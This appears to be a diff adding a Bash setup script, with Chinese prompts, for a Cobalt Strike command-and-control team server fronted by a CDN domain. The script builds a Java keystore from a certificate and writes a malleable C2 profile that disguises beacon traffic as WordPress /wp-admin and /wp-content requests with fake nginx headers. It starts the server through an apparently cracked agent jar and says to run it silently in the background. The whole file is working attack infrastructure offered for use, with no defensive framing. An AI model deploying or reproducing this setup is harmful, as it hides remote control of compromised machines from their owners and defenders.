@@ -1,0 +1,103 @@
+#!/bin/bash
+read -p "请输入您的CS_IP：" CS_IP
+read -p "请输入您的CS端口：" CS_PORT
+read -p "请输入CS密码：" CS_PASS
+read -p "请输入您的CDN域名：" DOMAIN
+read -p "请输入证书密码：" CERT_PASS
+
+openssl pkcs12 -export -in server.pem -inkey server.key -out $DOMAIN.p12 -name $DOMAIN -passout pass:$CERT_PASS
+
+keytool -importkeystore -deststorepass $CERT_PASS -destkeypass $CERT_PASS -destkeystore $DOMAIN.store -srckeystore $DOMAIN.p12 -srcstoretype PKCS12 -srcstorepass $CERT_PASS -alias $DOMAIN
+
+echo "
+https-certificate {
+    set keystore '$DOMAIN.store';
+    set password '$CERT_PASS';
+}
+http-get {
+
+    set uri '/wp-admin';
+    set verb 'GET';
+
+    client {
+
+        header 'Accept' 'RT-Anonymous';
+        header 'Host' '$DOMAIN';
+        header 'Referer' 'http://$DOMAIN/';
+        header 'Accept-Encoding' 'gzip, deflate';
+
+        metadata {
+            base64url;
+            prepend 'SESSION=';
+            header 'Cookie';
+        }
+    }
+
+    server {
+
+        header 'Server' 'nginx';
+        header 'Cache-Control' 'max-age=0, no-cache';
+        header 'Pragma' 'no-cache';
+        header 'Connection' 'keep-alive';
+        header 'Content-Type' 'charset=utf-8';
+
+        output {
+            base64;
+            prepend 'Anonymous-one';
+            append 'Anonymous-two';
+            print;
+        }
+    }
+}
+
+
+http-post {
+
+    set uri '/wp-content';
+    set verb 'POST';
+
+    client {
+
+        header 'Accept' 'RT-Anonymous';
+        header 'Host' '$DOMAIN';
+        header 'Referer' 'http://$DOMAIN/';
+        header 'Accept-Encoding' 'gzip, deflate';
+
+        id {
+            base64;
+            parameter 'SESSION';
+        }
+
+        output {
+            base64;
+            print;
+        }
+    }
+
+    server {
+
+        header 'Server' 'nginx';
+        header 'Cache-Control' 'max-age=0, no-cache';
+        header 'Pragma' 'no-cache';
+        header 'Connection' 'keep-alive';
+        header 'Content-Type' 'charset=utf-8';
+
+        output {
+            mask;
+            base64url;
+            prepend 'Anonymous-one';
+            append 'Anonymous-two';
+            print;
+        }
+    }
+}" > cdn.profile
+sed -i s#\'#\"#g cdn.profile
+
+echo "
+java -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=$CS_PORT -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./$DOMAIN.store -Djavax.net.ssl.keyStorePassword=$CERT_PASS -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=CSAgent.properties -Duser.language=en server.TeamServer \$* " > CS_teamserver
+
+chmod +x CS_teamserver
+echo "cd `pwd`
+./CS_teamserver $CS_IP $CS_PASS cdn.profile" > cs
+chmod +x cs
+echo "手动执行nohup ./cs &后台静默运行"
